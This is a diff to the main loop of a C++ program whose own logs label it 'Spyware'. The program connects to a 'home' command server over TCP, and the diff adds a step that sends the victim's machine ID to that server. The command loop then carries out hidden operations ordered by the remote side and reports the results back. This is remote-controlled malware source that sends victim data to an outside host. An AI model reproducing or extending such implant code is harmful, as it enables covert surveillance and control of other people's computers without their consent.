@@ -1,6 +1,8 @@
 #include <iostream>
 
 #include "../Maneger/Connection.h"
+#include "../Maneger/SocketConnection.h"
+
 #include "../IncludeCPP/Status.h"
 
 #include "../Maneger/HiderManeger.h"
@@ -10,12 +12,16 @@
 #include "contrapMeta.h"
 #include "Contraption.h"
 #include "ContraptionAdmin.h"
+#include "../IncludeCPP/getBasicInfo.h"
+
+int initRun(std::shared_ptr<Connection> conn);
+
 
 #define PORT (65410)
 
 #define DEBUG
 
-void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);
+void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);
 
 
 int main() {
@@ -24,11 +30,11 @@ int main() {
     
     HiderManeger& hiderManeger = HiderManeger::getInstance();
     ContraptionAdmin admin;
-    std::shared_ptr<Connection> conn;
+    std::shared_ptr<SocketConnection> conn;
     
     sleep(2); // wait for python to start
 
-    if (Connection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+    if (SocketConnection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
         exit(EXIT_FAILURE);
     }
     bool cont = true;
@@ -42,8 +48,21 @@ int main() {
 }
 
 
+// perform stuff after connection to home creation
+// meant for sending information required for operation
+int initRun(std::shared_ptr<Connection> conn) {
 
-void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
+
+    if (conn->sendString(getMachineID(), true) == false) {
+        std::cerr << "error sending machine id" << std::endl;
+        exit(EXIT_FAILURE);
+    }
+
+    return 0;
+}
+
+
+void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
 {
     command cmd;
 
@@ -67,15 +86,18 @@ void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, Cont
         std::exit(EXIT_SUCCESS);
     
     case HIDER_SETUP:
+        std::cerr << "start  hider setup\n";
         stat = hiderManeger.setUpHider(cmd.strParam);
+        std::cerr << "finnsh  hider setup\n";
         break;
     }
 
-    if (cmd.fncode & HIDDEN_OPRATION) {
+    if (cmd.fncode & HIDDEN_OPRATION && cmd.fncode < (HIDDEN_OPRATION << 1)) {
         stat = hiderManeger.hiddenAction(cmd, conn);
     }
 
-    std::cerr << "Spyware:  Conn: res-" << stat << " response-\n" << strRes << std::endl;
+    conn->flushInput();
+    std::cerr << "Spyware:  Conn: res-" << stat << "\nresponse-" << strRes << std::endl;
     conn->sendResponce(stat, strRes);
-    std::cerr << "responce sent" << std::endl;
+    std::cerr << "Spyware: responce sent" << std::endl;
 }
